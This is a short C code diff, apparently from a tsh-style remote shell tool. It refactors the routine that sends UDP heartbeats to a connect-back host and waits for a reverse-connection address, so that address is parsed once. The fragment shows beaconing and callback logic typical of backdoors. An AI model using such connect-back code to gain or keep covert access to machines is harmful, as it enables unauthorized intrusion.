@@ -61,12 +61,9 @@ void usage(char *argv0)
     exit(1);
 }
 
-int hasWaitConnectSignal(int udpSock, struct sockaddr_in *outServer) {
-	struct sockaddr_in udpAddr;
+int hasWaitConnectSignal(int udpSock, struct sockaddr_in *udpAddr, struct sockaddr_in *outServer) {
 	static time_t lastHeartBeatTime;
 #define MAX_UDP_HEARTBEAT (1 * 60)
-
-	udpAddr = parseHostAndPort(cb_host, UDP_ProxyPort);
 
 	if (time(NULL) - lastHeartBeatTime > MAX_UDP_HEARTBEAT) {
 		struct tshProtocol data;
@@ -74,8 +71,8 @@ int hasWaitConnectSignal(int udpSock, struct sockaddr_in *outServer) {
 		data.type = UPD_HEADBEAT;
 		data.length = sizeof(data);
 
-		info("udp send heart beat data to %s " IPBLabel "\n", cb_host, IPBValue(udpAddr));
-		udpSendPacket(udpSock, &data, &udpAddr);
+		info("udp send heart beat data to %s " IPBLabel "\n", cb_host, IPBValue(*udpAddr));
+		udpSendPacket(udpSock, &data, udpAddr);
 		lastHeartBeatTime = time(NULL);
 	}
 	// 返回0表示有等待的连接请求
@@ -95,7 +92,7 @@ int hasWaitConnectSignal(int udpSock, struct sockaddr_in *outServer) {
 	outServer->sin_addr.s_addr = recvdata.listen_ip;
 	outServer->sin_port = recvdata.listen_port;
 	if (outServer->sin_addr.s_addr == 0) {
-		outServer->sin_addr.s_addr = udpAddr.sin_addr.s_addr;
+		outServer->sin_addr.s_addr = udpAddr->sin_addr.s_addr;
 	}
 
 	return 0;
@@ -266,12 +263,14 @@ int main( int argc, char **argv )
 		tv.tv_usec = 0;
 		setsockopt(udpServer, SOL_SOCKET, SO_RCVTIMEO, (const void *)&tv, (socklen_t)sizeof(tv));
 
+		struct sockaddr_in udpAddr = parseHostAndPort(cb_host, UDP_ProxyPort);
+
 	    while( 1 )
 	    {
 			struct sockaddr_in sServer;
 			if (proxyUdp) {
 				/* 如果UDP发送过来了反向连接的ip:port */
-				if(hasWaitConnectSignal(udpServer, &sServer) != 0) {
+				if(hasWaitConnectSignal(udpServer, &udpAddr, &sServer) != 0) {
 					// 如果没有反向连接数据.
 					continue;
 				}
